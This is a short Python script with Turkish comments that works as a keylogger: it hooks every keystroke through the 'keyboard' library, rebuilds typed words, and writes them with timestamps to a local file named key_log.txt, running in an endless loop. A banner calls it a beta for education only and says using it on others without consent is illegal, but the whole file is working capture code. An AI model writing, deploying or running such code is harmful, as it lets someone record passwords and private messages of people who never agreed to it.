import keyboard  # Klavye dinlemek için gerekli kütüphane
import datetime  # Tarih ve saat almak için gerekli kütüphane
import time  # Zamanlama işlemleri için gerekli kütüphane

# Uyarı ve Sürüm Bilgisi
VERSION = "Beta 1.0"
print(f"Program Sürümü: {VERSION} - Yalnızca deneme amaçlı kullanın.")
print("UYARI: Bu yazılım bir beta sürümüdür ve yalnızca eğitim ve deneme amaçlı kullanılmalıdır.")
print("Yasal sorumluluk kullanıcıya aittir. Başkalarının izni olmadan bu programı kullanmak yasadışıdır.\n")

word = ""  # Girilen kelimeleri biriktirecek değişken
interval = 10  # Log dosyasını kontrol etme aralığı (saniye cinsinden)

# Başlangıçta log dosyasını temiz bir şekilde açıyoruz
with open("key_log.txt", "w") as dosya:
    pass

# Klavyeye basıldığında çalışacak fonksiyon
def on_press(key):
    global word
    # Eğer tuş boşluk veya enter ise
    if key.name in ["space", "enter"]:
        with open("key_log.txt", "a") as file:
            # Girilen kelimeyi ve tarih bilgisini aynı satıra birleşik şekilde yaz
            file.write(f"{word} (Tarih: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) ")
        word = ""  # Yazdıktan sonra kelimeyi sıfırla
    elif key.name == "backspace":  # Eğer tuş backspace ise
        word = word[:-1]  # Son karakteri sil
    else:
        word += key.name  # Diğer tuşları kelimeye ekle

# Tuşlara basıldığında 'on_press' fonksiyonunu çağır
keyboard.on_press(on_press)

# Sürekli çalışan bir döngü (log dosyasını her 'interval' sürede bir kontrol eder)
while True:
    time.sleep(interval)  # Belirlenen süre boyunca bekle
